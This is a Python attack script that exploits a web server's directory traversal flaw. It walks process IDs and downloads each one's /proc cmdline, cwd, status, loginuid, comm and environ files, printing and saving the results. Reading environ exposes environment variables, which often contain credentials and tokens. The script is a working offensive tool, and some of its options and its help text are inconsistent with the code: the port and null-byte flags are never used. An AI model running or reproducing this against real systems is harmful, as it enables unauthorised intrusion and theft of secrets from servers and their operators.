#!/usr/bin/env python3

# Extracts useful information about a system based on /proc, including ps listing.



import requests,argparse,sys,os
from pathlib import Path


def createDir(directory):
	newdir=Path(os.getcwd(),directory)  
	vprint("Creating {}".format(newdir))

	try:
		os.makedirs(newdir,0o775,True)
	except FileExistsError:
		print("{} already exists.".format(newdir))
		pass
	except OSError as e:
		raise e
	finally:
		return newdir



def writeFile(filename,content,directory):

	# First crunch the path/filename from target to a flat file name
	tmpfile=filename

	# Handle Unix paths
	# If unix path starts with leading /, delete it
	if tmpfile.startswith('/'):
		tmpfile=tmpfile.replace('/','',1)

	# replace the others with an underscore
	tmpfile=tmpfile.replace('/','_')
	
	# handle Windows paths
	tmpfile=tmpfile.replace(':','')
	tmpfile=tmpfile.replace('\\','_')

	# Build the full file path
	d=Path(directory)
	f=d/tmpfile

	# Then open the file and write it.
	f=str(f).rstrip()

	if len(content)>0:
		print("Writing file {}".format(f))
		try:
			fh = open(f,"w")
			fh.write(content)
			fh.close()
		except OSError as e:
			raise



def main(args):
	infoToGet=["cmdline","cwd","status","loginuid","comm","environ"]
	max_pid=args.max_pid
	url=args.url
	outdir=args.outdir





	# Create Output Directory if required
	if outdir!=None:
		print("Output directory: {}".format(outdir))
		fulldir=createDir(outdir)
	else:
		fulldir=None


	proc_url="{}/proc".format(url)

	for pid in range (max_pid):
		pid_url="{}/{}".format(proc_url,pid)

		procinfo=dict.fromkeys(infoToGet)


		for key in procinfo:
			response=None
			req_url="{}/{}".format(pid_url,key)

			dprint(req_url)
			response = requests.get(req_url,allow_redirects = False)

			if response.status_code>300 and response.status_code <=399:
				vprint("WARNING: Redirected to {}".format(response.headers["location"]))


			if (response.status_code==200) or ( response.status_code>300 and response.status_code <=399 ):
				if len(response.text)!=0: 
					procinfo[key] = response.text   # was .content
					print("/proc/{}/{}".format(pid,key))
					print (procinfo[key])
					if fulldir!=None:
						writeFile("{}-{}".format(pid,key),response.text,fulldir)

					print("----------------------------------------------------------")
			else:
				print("{} Error requesting {}.".format(str(response.status_code),req_url))
				#print(str(r.status_code)+ " Error requesting "+url)
				print("----------------------------------------------------------")

		





if __name__== '__main__':

	parser = argparse.ArgumentParser( 
	                                description = "Brute forces file descriptors for a given pid when you have Directory Traversal",
	                                epilog = "As an alternative to the commandline, params can be placed in a file, one per line, and specified on the commandline like '%(prog)s @params.conf'.",
	                                fromfile_prefix_chars = '@' )

	parser.add_argument(
	                      "url",
	                      help = "Full path to directory traversal vulnerability.  Don't include a final slash. e.g http://hostname/path?arg=../../../")

#	parser.add_argument(
#						  "traversal_string",
#						  help="The string required to reach the root directory, e.g. ../../../..")

	parser.add_argument(
	                      "-p",
	                      "--port",
	                      default=80,
	                      help="Specify port",
	                      action="store")

	parser.add_argument(
	                      "-P",
	                      "--max_pid",
	                      default=30000,
	                      help="Specify maximum pid to iterate to",
	                      action="store")


	parser.add_argument(
	                      "-v",
	                      "--verbose",
	                      help="increase output verbosity",
	                      action="store_true")
	parser.add_argument(
	                      "-d",
	                      "--debug",
	                      help="debug output",
	                      action="store_true")

	parser.add_argument(
						  "-o",
						  "--outdir",
						  help="Specify a directory relative to the current directory to save files.\n Directory will be created if necessary. Filenames will be flattened in here")
	
	parser.add_argument(
						  "-n",
						  "--nullbyte",
						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
						  action="store_true")



	if len(sys.argv)==1:
		parser.print_help()
		sys.exit()

	args = parser.parse_args()

	# Define a verbose printing mechanism
	vprint = print if args.verbose else lambda *a, **k: None

	#define a seperate debug print
	dprint = print if args.debug else lambda *a, **k: None






main(args)

